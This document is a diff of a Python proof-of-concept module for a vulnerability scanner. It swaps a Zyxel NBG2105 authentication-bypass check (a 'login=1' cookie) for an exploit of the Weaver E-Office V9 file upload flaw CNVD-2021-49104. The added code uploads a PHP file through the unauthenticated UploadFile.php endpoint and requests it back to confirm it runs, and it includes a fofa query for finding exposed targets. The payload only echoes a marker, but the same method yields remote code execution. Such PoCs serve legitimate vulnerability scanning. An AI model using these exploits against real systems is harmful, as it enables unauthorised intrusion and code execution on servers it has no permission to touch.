@@ -1,6 +1,6 @@
 # coding:utf-8  
 import requests
-from lib.core.common import url_handle,get_random_ua
+from lib.core.common import url_handle,get_random_ua,random_str
 from lib.core.poc import POCBase
 # ...
 import urllib3
@@ -14,20 +14,21 @@ class POC(POCBase):
         "CreateDate" : "2021-06-09",        # POC创建时间
         "UpdateDate" : "2021-06-09",        # POC创建时间
         "PocDesc" : """
-        略  
+            略  
         """,                                # POC描述，写更新描述，没有就不写
 
-        "name" : "Zyxel NBG2105身份验证绕过",                        # 漏洞名称
+        "name" : "泛微OA E-Office V9文件上传漏洞(CNVD-2021-49104)",                        # 漏洞名称
         "VulnID" : "oFx-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
-        "AppName" : "Zyxel NBG2105",                     # 漏洞应用名称
-        "AppVersion" : "",                  # 漏洞应用版本
+        "AppName" : "泛微OA E-Office",                     # 漏洞应用名称
+        "AppVersion" : "E-Office V9",                  # 漏洞应用版本
         "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
         "VulnDesc" : """
-            Zyxel NBG2105 存在身份验证绕过，攻击者通过更改 login参数可用实现后台登陆
+            泛微e-office是泛微旗下的一款标准协同移动办公平台。
+            由于 e-office 未能正确处理上传模块中的用户输入，攻击者可以通过该漏洞构造恶意的上传数据包，最终实现任意代码执行。
         """,                                # 漏洞简要描述
 
         "fofa-dork":"""
-            app="ZyXEL-NBG2105"
+            app="泛微-EOffice"
         """,                     # fofa搜索语句
         "example" : "",                     # 存在漏洞的演示url，写一个就可以了
         "exp_img" : "",                      # 先不管  
@@ -42,24 +43,38 @@ class POC(POCBase):
         不存在漏洞：vuln = [False,""]
         """
         vuln = [False,""]
-        url = self.target + "/login_ok.htm" # url自己按需调整
-        
+        url0 = self.target + "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=" # url自己按需调整
+        url1 = self.target+"/images/logo/logo-eoffice.php"
 
-        headers = {"User-Agent":get_random_ua(),
+        flag = random_str()
+
+        headers = {"Host":"",
+            "User-Agent":get_random_ua(),
                     "Connection":"close",
-                    "cookie":"login=1",
-                    # "Content-Type": "application/x-www-form-urlencoded",
+                    'Content-Type': 'multipart/form-data; boundary=f99b1021cc5269dcca9fbb0012f3663d'
                     }
-        
+        data = """
+--f99b1021cc5269dcca9fbb0012f3663d
+Content-Disposition: form-data; name="Filedata"; filename="cmd.php"
+Content-Type: image/jpeg
+
+<?php 
+echo "{flag}";
+?>
+--f99b1021cc5269dcca9fbb0012f3663d--
+""".format(flag=flag)
         try:
             """
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
-            req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if req.status_code == 200 and "GMT" in req.text and "ZyXEL" in req.text:#req.status_code == 200 and :
-                vuln = [True,req.text]
+            req0 = requests.post(url0,data=data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
+            if req0.status_code == 200 and "logo-eoffice.php" in req0.text:
+                req1 = requests.get(url1, proxies = self.proxy ,timeout = self.timeout,verify = False)
+                if req1.status_code == 200 and flag in req1.text:
+                # if req1.status_code == 200 and flag in req1.text:
+                    vuln = [True,req1.text]
             else:
-                vuln = [False,req.text]
+                vuln = [False,req0.text]
         except Exception as e:
             raise e
         
